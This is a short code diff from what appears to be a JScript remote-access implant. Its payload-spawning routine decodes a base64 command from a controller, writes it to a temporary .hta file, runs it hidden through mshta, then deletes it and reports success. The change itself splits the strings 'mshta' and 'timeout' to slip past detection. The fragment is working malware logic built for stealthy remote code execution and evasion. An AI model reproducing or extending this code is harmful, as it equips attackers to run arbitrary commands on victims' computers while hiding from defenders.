@@ -168,7 +168,7 @@ function main()
           fd = fso.CreateTextFile(temp + "\\" + id + ".hta")
           fd.WriteLine(b64d(jsObject.cmnd.split(" ")[1]))
           fd.close()
-          runner.Run(temp + "\\" + id + ".hta", 0, false)
+          runner.Run("ms" + "hta " + temp + "\\" + id + ".hta", 0, false)
           runner.Run(cs +" /q /c " + "tim" + "eout " + "/t " + "1", 0, true)
           fso.DeleteFile(temp + "\\" + id + ".hta")
           retval = "[+] Spawn success..."
